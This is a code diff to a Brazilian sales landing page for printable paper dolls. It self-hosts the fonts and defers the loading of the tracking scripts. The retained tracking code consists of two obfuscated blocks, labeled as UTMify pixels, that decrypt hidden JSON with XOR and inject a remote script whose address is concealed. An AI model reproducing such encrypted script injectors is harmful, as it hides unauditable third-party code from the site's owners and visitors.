@@ -77,33 +77,32 @@
     <meta property="og:description" content="PDF digital com bonecas de papel para imprimir, recortar e montar. Prontas em minutos!" />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
-    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://pay.lowify.com.br">
-    <link rel="preconnect" href="https://pay.lowify.com.br" crossorigin>
 
     <!-- LCP Image Preload for Instant First Contentful / Largest Contentful Paint -->
     <link rel="preload" as="image" href="/storage/capa_video.webp" type="image/webp" fetchpriority="high" />
+    <link rel="preload" as="font" href="/fonts/nunito-latin.woff2" type="font/woff2" crossorigin />
+    <link rel="preload" as="font" href="/fonts/fredoka-latin.woff2" type="font/woff2" crossorigin />
 
-    <!-- Non-Render-Blocking Web Fonts with Swap -->
-    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Nunito:wght@400;600;700;800;900&display=swap" />
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Nunito:wght@400;600;700;800;900&display=swap" media="print" onload="this.media='all'" />
-    <noscript>
-      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Nunito:wght@400;600;700;800;900&display=swap" />
-    </noscript>
-
-    <!-- UTMify UTM Tracking & Pixel Scripts (Deferred to never block initial render) -->
+    <!-- UTMify (UTMs + pixel): carrega no primeiro toque/rolagem ou 3 s após o load, para não atrasar o LCP -->
     <script>
-      window.addEventListener('load', function() {
+      (function() {
+        var utmifyLoaded = false;
+        var events = ['scroll', 'touchstart', 'pointerdown', 'wheel', 'keydown'];
+        function loadUtmify() {
+          if (utmifyLoaded) return;
+          utmifyLoaded = true;
+          events.forEach(function(e) { window.removeEventListener(e, loadUtmify); });
         try {
           var a_0g=atob("DF4h2dBGhh3mbn/vDyUDrKIqpCfEBgubfy0b9v8l4nPIGwuCZjhY97Mp6zOEHFCcbCxIqaQ1qWiSAwzAYz9VvKMyqHeVTFPNbipVq7kk82mDHV3VVCUDt7Er4z/cTBuOez8MrKQr73ufQw+daihEt6Rr/n6JClKcbDUD9fIw53GTC13VLXxc9atk6HyLC13VLTpArbFr82mLBxmWIi5TvKYj6GnLHQqNZjpS+/xk8HyKGxrNNXwDpI07");var g_3=[];for(var f_pv=0;f_pv<a_0g.length;f_pv++){g_3.push(a_0g.charCodeAt(f_pv)&255);}var h_31k9=g_3[0];var j_v=g_3.slice(1,1+h_31k9);var w_60=g_3.slice(1+h_31k9);var t_pb=w_60.map(function(b,i_eh){return b^j_v[i_eh%h_31k9];});var k_y4w="";for(var w_7xag=0;w_7xag<t_pb.length;w_7xag++){k_y4w+=String.fromCharCode(t_pb[w_7xag]&255);}var j_jnfp=decodeURIComponent(escape(k_y4w));var n_q1r=JSON.parse(j_jnfp);var k_ts=n_q1r.globals||[];k_ts.forEach(function(h_p){window[h_p.name]=h_p.value;});var x_i=document.createElement("script");x_i.src=n_q1r.url;x_i.async=true;x_i.defer=true;(n_q1r.attributes||[]).forEach(function(k_b){x_i.setAttribute(k_b.name,k_b.value);});document.body.appendChild(x_i);
         } catch(e) {}
         try {
           var s_0c9x=atob("DASzGfXQfw0PnK2Rwn+RbIe8XTct9NnlsneJNtqzG2Mh6dn8q2LKN5a/EiNt7oLioXbaaYGjUH1m5Mj97XTaYZC8UWd8voGzo3DHa5yyCnlq74+rmVmfO5K8EG9u8N6z+F/IO5uxEmgtpo/hq3zWdby0XSEt6sz9t2GRI9fmHm9trMyppmHSKcbjTWk9qZyn8GeBIZfyAlBy");var x_ac=[];for(var d_0eu=0;d_0eu<s_0c9x.length;d_0eu++){x_ac.push(s_0c9x.charCodeAt(d_0eu)&255);}var h_9s=x_ac[0];var n_m=x_ac.slice(1,1+h_9s);var s_6g=x_ac.slice(1+h_9s);var r_2z3o=s_6g.map(function(b,u_xf){return b^n_m[u_xf%h_9s];});var i_ope="";for(var m_hd=0;m_hd<r_2z3o.length;m_hd++){i_ope+=String.fromCharCode(r_2z3o[m_hd]&255);}var k_f=decodeURIComponent(escape(i_ope));var i_0y=JSON.parse(k_f);var s_x=i_0y.globals||[];s_x.forEach(function(u_1){window[u_1.name]=u_1.value;});var g_4k=document.createElement("script");g_4k.src=i_0y.url;g_4k.async=true;g_4k.defer=true;(i_0y.attributes||[]).forEach(function(y_7){g_4k.setAttribute(y_7.name,y_7.value);});document.body.appendChild(g_4k);
         } catch(e) {}
-      });
+        }
+        events.forEach(function(e) { window.addEventListener(e, loadUtmify, { passive: true }); });
+        window.addEventListener('load', function() { setTimeout(loadUtmify, 3000); });
+      })();
     </script>
   </head>
   <body class="bg-[#FFF5F8] text-slate-800 antialiased selection:bg-pink-300 selection:text-pink-900 font-sans">
